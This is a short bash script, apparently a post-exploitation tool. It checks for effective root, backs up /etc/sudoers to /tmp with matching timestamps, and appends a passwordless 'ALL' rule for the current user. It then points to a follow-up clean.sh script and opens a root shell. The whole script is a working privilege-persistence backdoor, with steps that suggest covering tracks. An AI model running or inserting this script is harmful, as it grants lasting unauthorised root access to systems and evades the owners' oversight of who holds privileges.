#!/bin/bash

if [ $(whoami) != "root" ]; then
echo "You euid is not root my friend."
exit
fi

CUSERNAME=$(id | awk -F "(" '{print $2}'|awk -F ")" '{print $1}')
cp -f /etc/sudoers /tmp/sudo
touch -acmr /etc/sudoers /tmp/sudo
echo $CUSERNAME"  ALL=NOPASSWD: ALL">>/etc/sudoers
CDIR=$(pwd)
echo "Next: sh $CDIR/clean.sh"
sudo su -
